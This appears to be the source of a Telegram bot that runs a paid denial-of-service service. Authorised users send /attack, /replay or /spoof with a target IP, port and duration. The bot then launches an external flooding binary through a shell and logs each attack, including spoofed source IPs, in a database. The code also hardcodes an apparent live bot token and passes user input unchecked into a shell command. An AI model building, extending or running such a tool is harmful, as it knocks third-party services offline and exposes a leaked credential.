import os
import json
import time
import random
import string
import subprocess
import threading
import sqlite3
from datetime import datetime, timedelta
from dateutil.relativedelta import relativedelta
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext
import telebot
from telebot import types

# Replace with your Telegram bot token
TELEGRAM_BOT_TOKEN = "7519734348:AAH6grCtysibCCb62AXxgIx9lydeB9wMHhQ"

# Replace with your owner user ID (you can get this by sending /start to your bot and checking the logs)
OWNER_USER_ID = 708030615  # Replace with your actual owner user ID

# Initialize the bot
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# Global variables
MAX_ATTACK_TIME = 300  # Maximum allowed attack time in seconds (5 minutes)
ongoing_attack = False
current_attack_start_time = None
current_attack_duration = None
current_attack_target = None
current_attack_port = None

# SQLite database setup
DATABASE_NAME = "noobam_bot.db"

# Function to initialize the database
def initialize_database():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()

    # Create users table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            duration TEXT
        )
    """)

    # Create admins table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS admins (
            user_id INTEGER PRIMARY KEY,
            coins INTEGER
        )
    """)

    # Create attack_history table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS attack_history (
            user_id INTEGER,
            type TEXT,
            target TEXT,
            port INTEGER,
            duration INTEGER,
            spoofed_ip TEXT,
            timestamp TEXT
        )
    """)

    # Add the owner as an admin with unlimited coins
    cursor.execute("""
        INSERT OR IGNORE INTO admins (user_id, coins) VALUES (?, ?)
    """, (OWNER_USER_ID, float("inf")))

    conn.commit()
    conn.close()

# Function to add a user to the database
def add_user(user_id, duration_str):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO users (user_id, duration) VALUES (?, ?)
    """, (user_id, duration_str))
    conn.commit()
    conn.close()
    return f"User {user_id} added with duration: {duration_str}"

# Function to retrieve all users from the database
def get_users():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM users")
    users = {row[0] for row in cursor.fetchall()}
    conn.close()
    return users

# Function to add an admin to the database
def add_admin(user_id, coins):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR REPLACE INTO admins (user_id, coins) VALUES (?, ?)
    """, (user_id, coins))
    conn.commit()
    conn.close()
    return f"Admin {user_id} added with {coins} coins."

# Function to retrieve all admins from the database
def get_admins():
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("SELECT user_id FROM admins")
    admins = {row[0] for row in cursor.fetchall()}
    conn.close()
    return admins

# Function to add an attack to the user's history in the database
def add_attack_history(user_id, attack_type, target, port, duration, spoofed_ip=None):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO attack_history (user_id, type, target, port, duration, spoofed_ip, timestamp)
        VALUES (?, ?, ?, ?, ?, ?, ?)
    """, (user_id, attack_type, target, port, duration, spoofed_ip, time.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

# Function to retrieve the attack history for a user from the database
def get_attack_history(user_id):
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        SELECT type, target, port, duration, spoofed_ip, timestamp
        FROM attack_history
        WHERE user_id = ?
    """, (user_id,))
    history = cursor.fetchall()
    conn.close()
    return history

# Initialize the database when the script starts
initialize_database()

# Dictionary to store monitoring status for each user
monitoring_users = set()

# Function to send monitoring updates
def send_monitoring_update(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration
    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        update_message = f"🕒 Attack in progress: {elapsed_time}/{current_attack_duration} seconds"
        bot.reply_to(message, update_message)

# Command: /start
@bot.message_handler(commands=["start"])
def start(message):
    response = (
        "👋 Hello! Welcome to the Noobam Bot!\n\n"
        "🤖 Here's what you can do:\n"
        "- Use /attack to initiate an attack.\n"
        "- Use /replay to replay the last attack.\n"
        "- Use /spoof to simulate an IP spoofing attack.\n"
        "- Use /monitor to monitor an ongoing attack.\n"
        "- Use /history to view your attack history.\n"
        "- Use /status to check the status of the current attack.\n"
        "- Use /stop to stop an ongoing attack.\n"
        "- Use /help to see all commands.\n\n"
        "🚀 Enjoy using the bot!"
    )
    bot.reply_to(message, response)

# Command: /help
@bot.message_handler(commands=["help"])
def help_command(message):
    response = (
        "🛠️ Available Commands:\n\n"
        "- /start: Start the bot.\n"
        "- /help: Show this help message.\n"
        "- /attack <target> <port> <duration>: Initiate an attack.\n"
        "- /replay: Replay the last attack.\n"
        "- /spoof <target> <port> <duration> <spoofed_ip>: Simulate an IP spoofing attack.\n"
        "- /monitor: Monitor an ongoing attack.\n"
        "- /history: View your attack history.\n"
        "- /status: Check the status of the current attack.\n"
        "- /stop: Stop an ongoing attack.\n"
        "- /addadmin <userid> <coins>: Add a new admin (owner only).\n"
        "- /adduser <userid> <duration>: Add a new user.\n"
    )
    # Send message without Markdown
    bot.send_message(message.chat.id, response)

# Command: /addadmin
@bot.message_handler(commands=["addadmin"])
def add_admin_command(message):
    user_id = int(message.chat.id)

    # Check if the user is the owner
    if user_id != OWNER_USER_ID:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Usage: /addadmin <userid> <coins>")
        return

    details = message.text.split()
    new_admin_id = int(details[1])
    coins = int(details[2])

    # Add the new admin
    result = add_admin(new_admin_id, coins)
    bot.reply_to(message, result)

# Command: /adduser
@bot.message_handler(commands=["adduser"])
def add_user_command(message):
    user_id = int(message.chat.id)

    # Check if the user is an admin
    admins = get_admins()
    if user_id not in admins:
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, "❌ Usage: /adduser <userid> <duration>")
        return

    details = message.text.split()
    user_id_to_add = details[1]
    duration_str = " ".join(details[2:])
    result = add_user(user_id_to_add, duration_str)
    bot.reply_to(message, result)

# Command: /attack
@bot.message_handler(commands=["attack"])
def attack_command(message):
    global ongoing_attack

    user_id = message.chat.id

    # Check if the user is authorized (must be in the users table)
    authorized_users = get_users()
    if user_id not in authorized_users:
        bot.reply_to(message, "🚫 You are not authorized to use this command. Contact an admin.")
        return

    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        response = (
            f"⏳ Cooldown active! An attack is already running.\n"
            f"⏱️ Remaining time: {remaining_time} seconds\n"
            f"Use /status to monitor the attack."
        )
        bot.reply_to(message, response)
        return

    response = "𝗘𝗻𝘁𝗲𝗿 𝘁𝗵𝗲 𝘁𝗮𝗿𝗴𝗲𝘁 𝗶𝗽, 𝗽𝗼𝗿𝘁 𝗮𝗻𝗱 𝗱𝘂𝗿𝗮𝘁𝗶𝗼𝗻 𝗶𝗻 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 𝘀𝗲𝗽𝗮𝗿𝗮𝘁𝗲𝗱 𝗯𝘆 𝘀𝗽𝗮𝗰𝗲"
    bot.reply_to(message, response)
    bot.register_next_step_handler(message, process_attack_details)


# Function to log attack details
def log_command(user_id, target, port, attack_time):
    """
    Log the attack details in the database.
    """
    conn = sqlite3.connect(DATABASE_NAME)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT INTO attack_history (user_id, type, target, port, duration, timestamp)
        VALUES (?, ?, ?, ?, ?, ?)
    """, (user_id, "attack", target, port, attack_time, time.strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

# Function to process attack details
def process_attack_details(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration, current_attack_target, current_attack_port

    user_id = str(message.chat.id)
    details = message.text.split()

    if len(details) == 3:
        target = details[0]
        try:
            port = int(details[1])
            attack_time = int(details[2])  # ✅ Renamed from 'time' to 'attack_time'

            if attack_time > MAX_ATTACK_TIME:
                response = f"❗️ Error: Maximum allowed attack time is {MAX_ATTACK_TIME} seconds!"
            else:
                # Log the attack with correct variable name
                log_command(user_id, target, port, attack_time)  # ✅ Call log_command here
                full_command = f"./shubh {target} {port} {attack_time} 999 999"  # ✅ Correct variable name

                username = message.chat.username or "No username"
                response = f"✅ Attack launched on {target}:{port} for {attack_time} seconds by {username}."

                # Start the attack
                ongoing_attack = True
                current_attack_start_time = time.time()
                current_attack_duration = attack_time
                current_attack_target = target
                current_attack_port = port

                # Run the attack command in a separate thread
                threading.Thread(target=run_attack, args=(full_command, attack_time, message)).start()

        except ValueError:
            response = "❗️ Error: Invalid port or attack time. Please provide numeric values."
    else:
        response = "❗️ Error: Invalid format. Expected: /attack target port time"

    bot.reply_to(message, response)

# Function to run the attack command
def run_attack(full_command, attack_time, message):
    global ongoing_attack

    try:
        # Execute the attack command
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        start_time = time.time()

        # Monitor the attack progress
        while time.time() - start_time < attack_time and ongoing_attack:
            # Send monitoring updates
            elapsed_time = int(time.time() - start_time)
            remaining_time = attack_time - elapsed_time
            update_message = f"🕒 Attack in progress: {elapsed_time}/{attack_time} seconds"
            bot.reply_to(message, update_message)
            time.sleep(1)  # Wait 1 second before updating

        # Stop the attack if it exceeds the duration
        if ongoing_attack:
            process.terminate()
            bot.reply_to(message, "✅ Attack completed.")
        else:
            process.terminate()
            bot.reply_to(message, "🛑 Attack stopped by user.")

    except Exception as e:
        bot.reply_to(message, f"⚠️ Error during attack: {e}")
    finally:
        ongoing_attack = False
        current_attack_start_time = None
        current_attack_duration = None
        current_attack_target = None
        current_attack_port = None
        monitoring_users.clear()

# Command: /replay
@bot.message_handler(commands=["replay"])
def replay_command(message):
    global ongoing_attack

    user_id = str(message.chat.id)

    # Check if the user has previous attack details
    history = get_attack_history(user_id)
    if not history:
        bot.reply_to(message, "ℹ️ No previous attack details found. Use /attack first.")
        return

    # Get the last attack details
    last_attack = history[-1]
    target = last_attack[1]
    port = last_attack[2]
    duration = last_attack[3]

    # Add the replay to the user's history
    add_attack_history(user_id, "replay", target, port, duration)

    # Start the attack
    bot.reply_to(message, f"🚀 Replaying attack on {target}:{port} for {duration} seconds...")
    threading.Thread(target=run_attack, args=(f"./shubh {target} {port} {duration} 999 999", duration, message)).start()

# Command: /spoof
@bot.message_handler(commands=["spoof"])
def spoof_command(message):
    global ongoing_attack

    user_id = str(message.chat.id)

    if ongoing_attack:
        elapsed_time = int(time.time() - current_attack_start_time)
        remaining_time = current_attack_duration - elapsed_time
        response = (
            f"⏳ Cooldown active! An attack is already running.\n"
            f"⏱️ Remaining time: {remaining_time} seconds\n"
            f"Use /status to monitor the attack."
        )
        bot.reply_to(message, response)
        return

    if len(message.text.split()) < 4:
        bot.reply_to(message, "❌ Usage: /spoof <target> <port> <duration> <spoofed_ip>")
        return

    details = message.text.split()
    target = details[1]
    port = int(details[2])
    duration = int(details[3])
    spoofed_ip = details[4]

    # Add the spoofed attack to the user's history
    add_attack_history(user_id, "spoof", target, port, duration, spoofed_ip)

    # Start the spoofed attack
    bot.reply_to(message, f"🚀 Starting spoofed attack from {spoofed_ip} to {target}:{port} for {duration} seconds...")
    threading.Thread(target=run_attack, args=(f"./shubh {target} {port} {duration} 999 999", duration, message)).start()

# Command: /monitor
@bot.message_handler(commands=["monitor"])
def monitor_command(message):
    global ongoing_attack

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack to monitor.")
        return

    monitoring_users.add(message.chat.id)
    bot.reply_to(message, "🔍 You are now monitoring the ongoing attack.")

# Command: /history
@bot.message_handler(commands=["history"])
def history_command(message):
    user_id = str(message.chat.id)

    # Check if the user has any attack history
    history = get_attack_history(user_id)
    if not history:
        bot.reply_to(message, "ℹ️ No attack history found.")
        return

    # Build the history message
    history_message = "📜 Your Attack History:\n\n"
    for entry in history:
        if entry[0] == "spoof":
            history_message += (
                f"🕒 {entry[5]}\n"
                f"🔧 Type: Spoofed Attack\n"
                f"🎯 Target: {entry[1]}:{entry[2]}\n"
                f"⏱️ Duration: {entry[3]} seconds\n"
                f"📡 Spoofed IP: {entry[4]}\n\n"
            )
        else:
            history_message += (
                f"🕒 {entry[5]}\n"
                f"🔧 Type: {'Attack' if entry[0] == 'attack' else 'Replay'}\n"
                f"🎯 Target: {entry[1]}:{entry[2]}\n"
                f"⏱️ Duration: {entry[3]} seconds\n\n"
            )

    bot.reply_to(message, history_message)

# Command: /status
@bot.message_handler(commands=["status"])
def status_command(message):
    global ongoing_attack, current_attack_start_time, current_attack_duration, current_attack_target, current_attack_port

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack.")
        return

    elapsed_time = int(time.time() - current_attack_start_time)
    remaining_time = current_attack_duration - elapsed_time
    response = (
        f"🕒 Attack in progress:\n"
        f"🎯 Target: {current_attack_target}:{current_attack_port}\n"
        f"⏱️ Elapsed time: {elapsed_time} seconds\n"
        f"⏳ Remaining time: {remaining_time} seconds"
    )
    bot.reply_to(message, response)

# Command: /stop
@bot.message_handler(commands=["stop"])
def stop_command(message):
    global ongoing_attack

    if not ongoing_attack:
        bot.reply_to(message, "ℹ️ No ongoing attack to stop.")
        return

    ongoing_attack = False
    bot.reply_to(message, "🛑 Attack stopped.")

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.polling()